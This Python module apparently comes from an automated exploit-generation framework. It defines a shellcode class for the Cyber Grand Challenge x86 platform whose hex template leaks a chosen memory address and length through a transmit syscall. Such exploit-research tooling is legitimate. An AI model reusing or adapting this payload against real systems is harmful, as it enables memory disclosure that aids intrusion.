import struct
import logging
from rex.exploit.shellcode import Shellcode

l = logging.getLogger("rex.exploit.shellcodes.cgc_x86_setregister")

class X86LeakAddress(Shellcode):

    supported_platforms = ["cgc"]

    arch = "X86"

    name = "leakaddress"

    hex_code = "31c0404031db43b9%sba%s31f6cd80"

    def to_raw(self, address, length):
        #pylint:disable=arguments-differ
        '''
        :param addr: address to leak
        :param length: amount of bytes to write from leak
        '''

        encoded_address = struct.pack("<I", address).encode('hex')
        encoded_length = struct.pack("<I", length).encode('hex')

        return (X86LeakAddress.hex_code % (encoded_address, encoded_length)).decode('hex')
